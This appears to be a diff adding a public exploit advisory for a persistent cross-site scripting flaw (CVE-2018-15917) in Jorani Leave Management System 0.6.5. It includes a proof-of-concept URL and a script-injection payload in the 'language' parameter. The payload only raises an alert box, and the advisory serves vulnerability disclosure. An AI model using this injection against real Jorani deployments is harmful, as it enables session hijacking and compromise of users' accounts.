@@ -1,0 +1,27 @@
+# Exploit Title: Jorani Leave Management System 0.6.5 – Cross-Site Scripting
+# Exploit Author: Javier Olmedo
+# Website: https://hackpuntes.com
+# Date: 2018-09-06
+# Google Dork: N/A
+# Vendor: Benjamin BALET
+# Software Link: https://jorani.org/download.html
+# Affected Version: 0.6.5 and possibly before
+# Patched Version: unpatched
+# Category: Web Application
+# Platform: Windows
+# Tested on: Win10x64 & Kali Linux
+# CVE: 2018-15917
+  
+# 1. Technical Description:
+# Language parameter is vulnerable to Persistent Cross-Site Scripting (XSS) attacks through
+# a GET request in which the values are stored in the user session.
+  
+# 2. Proof Of Concept (PoC):
+# Go to http://localhost/session/language?last_page=session%2Flogin&language=en%22%3E%3Cscript%3Ealert(%27PoC%20CVE-2018-15917%27)%3C%2Fscript%3E&login=&CipheredValue=
+ 
+# 3. Payload:
+# en"><script>alert('PoC CVE-2018-15917')</script>
+
+# 6. Reference:
+# https://hackpuntes.com/cve-2018-15917-jorani-leave-management-system-0-6-5-cross-site-scripting-persistente/
+# https://github.com/bbalet/jorani/issues/254
